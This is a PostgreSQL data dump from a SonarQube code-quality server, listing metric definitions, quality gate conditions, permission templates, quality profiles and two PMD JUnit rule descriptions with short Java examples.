INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (83, 'overall_branch_coverage', 'Condition coverage by all tests', 1, 'Coverage', 'Overall Condition Coverage', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (84, 'new_overall_branch_coverage', 'Condition coverage of new/changed code by all tests', 1, 'Coverage', 'Overall Condition Coverage on New Code', true, 'PERCENT', false, true, 0.00000000000000000000, 100.00000000000000000000, false, false, true, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (85, 'overall_conditions_by_line', 'Overall conditions by all tests and by line', 0, 'Coverage', 'Overall Conditions by Line', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (86, 'overall_covered_conditions_by_line', 'Overall covered conditions by all tests and by line', 0, 'Coverage', 'Overall Covered Conditions by Line', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (101, 'new_major_violations', 'New Major issues', -1, 'Issues', 'New Major Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (102, 'new_minor_violations', 'New Minor issues', -1, 'Issues', 'New Minor Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (103, 'new_info_violations', 'New Info issues', -1, 'Issues', 'New Info Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (104, 'false_positive_issues', 'False positive issues', -1, 'Issues', 'False Positive Issues', false, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (105, 'wont_fix_issues', 'Won''t fix issues', -1, 'Issues', 'Won''t Fix Issues', false, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (106, 'open_issues', 'Open issues', -1, 'Issues', 'Open Issues', false, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (107, 'reopened_issues', 'Reopened issues', -1, 'Issues', 'Reopened Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (108, 'confirmed_issues', 'Confirmed issues', -1, 'Issues', 'Confirmed Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (109, 'code_smells', 'Code Smells', -1, 'Maintainability', 'Code Smells', false, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (110, 'new_code_smells', 'New Code Smells', -1, 'Maintainability', 'New Code Smells', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (111, 'bugs', 'Bugs', -1, 'Reliability', 'Bugs', false, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (112, 'new_bugs', 'New Bugs', -1, 'Reliability', 'New Bugs', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (88, 'duplicated_blocks', 'Duplicated blocks', -1, 'Duplications', 'Duplicated Blocks', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (89, 'duplicated_files', 'Duplicated files', -1, 'Duplications', 'Duplicated Files', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (90, 'duplicated_lines_density', 'Duplicated lines balanced by statements', -1, 'Duplications', 'Duplicated Lines (%)', true, 'PERCENT', false, true, 100.00000000000000000000, 0.00000000000000000000, true, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (91, 'duplications_data', 'Duplications details', 0, 'Duplications', 'Duplication Details', false, 'DATA', false, true, NULL, NULL, false, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (92, 'violations', 'Issues', -1, 'Issues', 'Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (93, 'blocker_violations', 'Blocker issues', -1, 'Issues', 'Blocker Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (94, 'critical_violations', 'Critical issues', -1, 'Issues', 'Critical Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (95, 'major_violations', 'Major issues', -1, 'Issues', 'Major Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (96, 'minor_violations', 'Minor issues', -1, 'Issues', 'Minor Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (97, 'info_violations', 'Info issues', -1, 'Issues', 'Info Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (98, 'new_violations', 'New issues', -1, 'Issues', 'New Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (99, 'new_blocker_violations', 'New Blocker issues', -1, 'Issues', 'New Blocker Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (100, 'new_critical_violations', 'New Critical issues', -1, 'Issues', 'New Critical Issues', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (113, 'vulnerabilities', 'Vulnerabilities', -1, 'Security', 'Vulnerabilities', false, 'INT', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (114, 'new_vulnerabilities', 'New Vulnerabilities', -1, 'Security', 'New Vulnerabilities', true, 'INT', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (115, 'sqale_index', 'Total effort (in days) to fix all the issues on the component and therefore to comply to all the requirements.', -1, 'Maintainability', 'Technical Debt', true, 'WORK_DUR', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (116, 'new_technical_debt', 'Added technical debt', -1, 'Maintainability', 'Added Technical Debt', true, 'WORK_DUR', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (117, 'sqale_rating', 'A-to-E rating based on the technical debt ratio', -1, 'Maintainability', 'Maintainability Rating', true, 'RATING', false, true, 5.00000000000000000000, 1.00000000000000000000, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (118, 'development_cost', 'SQALE development cost', -1, 'Maintainability', 'SQALE Development Cost', true, 'STRING', false, true, NULL, 0.00000000000000000000, true, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (119, 'sqale_debt_ratio', 'Ratio of the actual technical debt compared to the estimated cost to develop the whole source code from scratch', -1, 'Maintainability', 'Technical Debt Ratio', true, 'PERCENT', false, true, 100.00000000000000000000, 0.00000000000000000000, true, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (120, 'new_sqale_debt_ratio', 'Technical Debt Ratio of new/changed code.', -1, 'Maintainability', 'Technical Debt Ratio on New Code', true, 'PERCENT', false, true, 100.00000000000000000000, 0.00000000000000000000, true, false, false, 1);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (121, 'effort_to_reach_maintainability_rating_a', 'Effort to reach maintainability rating A', -1, 'Maintainability', 'Effort to Reach Maintainability Rating A', true, 'WORK_DUR', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (122, 'reliability_remediation_effort', 'Reliability Remediation Effort', -1, 'Reliability', 'Reliability Remediation Effort', true, 'WORK_DUR', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (123, 'new_reliability_remediation_effort', 'Reliability remediation effort on new code', -1, 'Reliability', 'Reliability Remediation Effort on New Code', true, 'WORK_DUR', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (124, 'reliability_rating', 'Reliability rating', -1, 'Reliability', 'Reliability Rating', true, 'RATING', false, true, 5.00000000000000000000, 1.00000000000000000000, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (125, 'security_remediation_effort', 'Security remediation effort', -1, 'Security', 'Security Remediation Effort', true, 'WORK_DUR', false, true, NULL, 0.00000000000000000000, true, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (126, 'new_security_remediation_effort', 'Security remediation effort on new code', -1, 'Security', 'Security Remediation Effort on New Code', true, 'WORK_DUR', false, true, NULL, 0.00000000000000000000, true, false, true, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (127, 'security_rating', 'Security rating', -1, 'Security', 'Security Rating', true, 'RATING', false, true, 5.00000000000000000000, 1.00000000000000000000, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (128, 'ncloc_data', NULL, 0, 'Size', 'ncloc_data', false, 'DATA', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (129, 'comment_lines_data', NULL, 0, 'Documentation', 'comment_lines_data', false, 'DATA', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (130, 'executable_lines_data', NULL, 0, 'Coverage', 'executable_lines_data', false, 'DATA', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (131, 'alert_status', 'The project status with regard to its quality gate.', 1, 'Releasability', 'Quality Gate Status', true, 'LEVEL', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (132, 'quality_gate_details', 'The project detailed status with regard to its quality gate', 0, 'General', 'Quality Gate Details', false, 'DATA', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (133, 'profile', 'Selected quality profile', 0, 'General', 'Profile', false, 'DATA', false, true, NULL, NULL, false, false, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (134, 'profile_version', 'Selected quality profile version', 0, 'General', 'Profile Version', false, 'INT', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (135, 'quality_profiles', 'Details of quality profiles used during analysis', 0, 'General', 'Profiles', false, 'DATA', false, true, NULL, NULL, false, true, false, NULL);
INSERT INTO metrics (id, name, description, direction, domain, short_name, qualitative, val_type, user_managed, enabled, worst_value, best_value, optimized_best_value, hidden, delete_historical_data, decimal_scale) VALUES (136, 'last_commit_date', NULL, 0, 'SCM', 'Date of Last Commit', false, 'MILLISEC', false, true, NULL, NULL, false, true, false, NULL);


--
-- Data for Name: notifications; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: perm_templates_groups; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO perm_templates_groups (id, group_id, template_id, permission_reference, created_at, updated_at) VALUES (1, 1, 1, 'admin', '2017-11-16 07:37:05.992', '2017-11-16 07:37:05.992');
INSERT INTO perm_templates_groups (id, group_id, template_id, permission_reference, created_at, updated_at) VALUES (2, 1, 1, 'issueadmin', '2017-11-16 07:37:05.999', '2017-11-16 07:37:05.999');
INSERT INTO perm_templates_groups (id, group_id, template_id, permission_reference, created_at, updated_at) VALUES (3, NULL, 1, 'user', '2017-11-16 07:37:06', '2017-11-16 07:37:06');
INSERT INTO perm_templates_groups (id, group_id, template_id, permission_reference, created_at, updated_at) VALUES (4, NULL, 1, 'codeviewer', '2017-11-16 07:37:06.002', '2017-11-16 07:37:06.002');


--
-- Data for Name: perm_templates_users; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: permission_templates; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO permission_templates (id, name, kee, description, created_at, updated_at, key_pattern) VALUES (1, 'Default template', 'default_template', 'This permission template will be used as default when no other permission configuration is available', '2017-11-16 07:37:05.968', '2017-11-16 07:37:05.968', NULL);


--
-- Data for Name: project_links; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: project_measures; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: project_qprofiles; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (3, 'AV_D0duqbbGRdfPp-qlg', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (4, 'AV_D0rlobbGRdfPp-qlh', 'java-sonar-way-87983');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (5, 'AV_D2aSabbGRdfPp-qlk', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (6, 'AV_D3YHdbbGRdfPp-qll', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (7, 'AV_D5CVZbbGRdfPp-qln', 'java-sonar-way-87983');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (8, 'AV_D5yyHbbGRdfPp-qlo', 'java-sonar-way-87983');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (10, 'AV_D6pQkbbGRdfPp-qlp', 'java-sonar-way-87983');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (11, 'AV_HaNa6bbGRdfPp-qlq', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (17, 'AV_IbOOJbbGRdfPp-qlz', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (19, 'AV_IlF5EbbGRdfPp-ql1', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (20, 'AV_IpYWvbbGRdfPp-ql3', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (21, 'AV_I729AbbGRdfPp-ql8', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (22, 'AV_JEk3zbbGRdfPp-ql-', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (27, 'AV_YH1cEbbGRdfPp-qmJ', 'java-egov-qualityprofile-20090');
INSERT INTO project_qprofiles (id, project_uuid, profile_key) VALUES (39, 'AV_ZHwHlbbGRdfPp-q9p', 'java-egov-qualityprofile-20090');


--
-- Data for Name: projects; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: properties; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO properties (id, prop_key, resource_id, text_value, user_id) VALUES (14, 'sonar.permission.template.default', NULL, 'default_template', NULL);
INSERT INTO properties (id, prop_key, resource_id, text_value, user_id) VALUES (68, 'sonar.core.id', NULL, '20171121021002', NULL);
INSERT INTO properties (id, prop_key, resource_id, text_value, user_id) VALUES (69, 'sonar.core.version', NULL, '5.6.7', NULL);
INSERT INTO properties (id, prop_key, resource_id, text_value, user_id) VALUES (70, 'sonar.core.startTime', NULL, '2017-11-21T02:10:02+0000', NULL);
INSERT INTO properties (id, prop_key, resource_id, text_value, user_id) VALUES (13, 'sonar.qualitygate', NULL, '8', NULL);


--
-- Data for Name: quality_gate_conditions; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (1, 1, 114, 1, 'GT', '0', NULL, '2017-11-16 07:36:47.952', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (2, 1, 112, 1, 'GT', '0', NULL, '2017-11-16 07:36:47.971', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (3, 1, 120, 1, 'GT', '5', NULL, '2017-11-16 07:36:47.983', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (4, 1, 37, 1, 'LT', '80', NULL, '2017-11-16 07:36:48.002', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (5, 4, 114, 1, 'GT', '0', NULL, '2017-11-16 07:49:52.066', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (6, 4, 112, 1, 'GT', '0', NULL, '2017-11-16 07:49:52.07', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (7, 4, 120, 1, 'GT', '5', NULL, '2017-11-16 07:49:52.074', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (8, 4, 37, 1, 'LT', '80', NULL, '2017-11-16 07:49:52.078', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (9, 5, 114, 1, 'GT', '0', NULL, '2017-11-16 07:52:29.911', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (10, 5, 112, 1, 'GT', '0', NULL, '2017-11-16 07:52:29.914', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (11, 5, 120, 1, 'GT', '5', NULL, '2017-11-16 07:52:29.914', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (12, 5, 37, 1, 'LT', '80', NULL, '2017-11-16 07:52:29.915', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (13, 6, 114, 1, 'GT', '0', NULL, '2017-11-17 07:45:54.061', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (14, 6, 112, 1, 'GT', '0', NULL, '2017-11-17 07:45:54.062', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (15, 6, 120, 1, 'GT', '5', NULL, '2017-11-17 07:45:54.063', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (17, 6, 90, NULL, 'GT', '', '', '2017-11-17 07:46:13.25', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (18, 6, 88, NULL, 'GT', '', '', '2017-11-17 07:46:14.28', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (19, 8, 114, 1, 'GT', '0', NULL, '2017-11-21 04:10:43.512', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (20, 8, 112, 1, 'GT', '0', NULL, '2017-11-21 04:10:43.513', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (21, 8, 120, 1, 'GT', '5', NULL, '2017-11-21 04:10:43.514', NULL);
INSERT INTO quality_gate_conditions (id, qgate_id, metric_id, period, operator, value_error, value_warning, created_at, updated_at) VALUES (22, 8, 37, 1, 'LT', '80', NULL, '2017-11-21 04:10:43.514', NULL);


--
-- Data for Name: quality_gates; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO quality_gates (id, name, created_at, updated_at) VALUES (1, 'SonarQube way', '2017-11-16 07:36:47.92', NULL);
INSERT INTO quality_gates (id, name, created_at, updated_at) VALUES (8, 'Default^Default-QualityGate', '2017-11-21 04:10:43.507', NULL);


--
-- Data for Name: resource_index; Type: TABLE DATA; Schema: public; Owner: sonar
--



--
-- Data for Name: rules; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1, 'Use assertSame instead of assertTrue', 'UseAssertSameInsteadOfAssertTrue', 'rulesets/java/junit.xml/UseAssertSameInsteadOfAssertTrue', 'pmd-unit-tests', 'This rule detects JUnit assertions in object references equality. These assertions should be made by more specific methods, like assertSame, assertNotSame.
<pre>
public class FooTest extends TestCase {
  void testCode() {
    Object a, b;

    assertTrue(a==b); // violation
    assertSame(a, b); // good usage
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811203, 1510817811211, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (2, 'JUnit Test Contains Too Many Asserts', 'JUnitTestContainsTooManyAsserts', 'rulesets/java/junit.xml/JUnitTestContainsTooManyAsserts', 'pmd-unit-tests', 'JUnit tests should not contain too many asserts.  Many asserts are indicative of a complex test, for which 
it is harder to verify correctness.  Consider breaking the test scenario into multiple, shorter test scenarios.  
Customize the maximum number of assertions used by this Rule to suit your needs. Example: 
<pre>
public class MyTestCase extends TestCase {
	// Ok
	public void testMyCaseWithOneAssert() {
		boolean myVar = false;		
		assertFalse("should be false", myVar);
	}

	// Bad, too many asserts (assuming max=1)
	public void testMyCaseWithMoreAsserts() {
		boolean myVar = false;		
		assertFalse("myVar should be false", myVar);
		assertEquals("should equals false", false, myVar);
	}
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811217, 1510817811223, 1);
